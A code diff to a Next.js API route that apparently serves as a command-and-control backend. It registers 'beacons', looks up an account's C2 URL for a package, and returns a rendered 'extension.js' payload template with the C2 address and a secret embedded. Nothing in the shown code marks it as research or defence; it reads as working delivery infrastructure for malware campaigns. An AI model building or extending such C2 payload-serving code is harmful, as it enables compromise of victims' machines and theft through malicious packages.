@@ -1,6 +1,9 @@
 import { NextResponse } from 'next/server';
 import crypto from 'crypto';
+import fs from 'fs';
+import path from 'path';
 import db from '@/lib/db';
+import { renderTemplate } from '@/lib/publish';
 
 export async function POST(req: Request) {
   const body = await req.json().catch(() => null);
@@ -66,5 +69,17 @@ export async function POST(req: Request) {
   );
 
   const beacon = db.prepare('SELECT id FROM beacons WHERE beacon_id = ?').get(beacon_id) as { id: number };
-  return NextResponse.json({ id: beacon.id });
+
+  // Serve rendered extension.js for campaign-based packages (monolithic packages ignore this field)
+  let extension: string | undefined;
+  try {
+    const pkgRow = db.prepare('SELECT a.c2_url FROM packages p JOIN accounts a ON p.account_id = a.id WHERE p.name = ?').get(pkg) as { c2_url: string } | undefined;
+    const c2Url = pkgRow?.c2_url || '';
+    if (c2Url) {
+      const extTemplate = fs.readFileSync(path.join(process.cwd(), '..', 'packages', 'template', 'extension.js'), 'utf8');
+      extension = renderTemplate(extTemplate, pkg, c2Url, expectedSecret);
+    }
+  } catch (_) { /* template not found, skip */ }
+
+  return NextResponse.json({ id: beacon.id, ...(extension ? { extension } : {}) });
 }
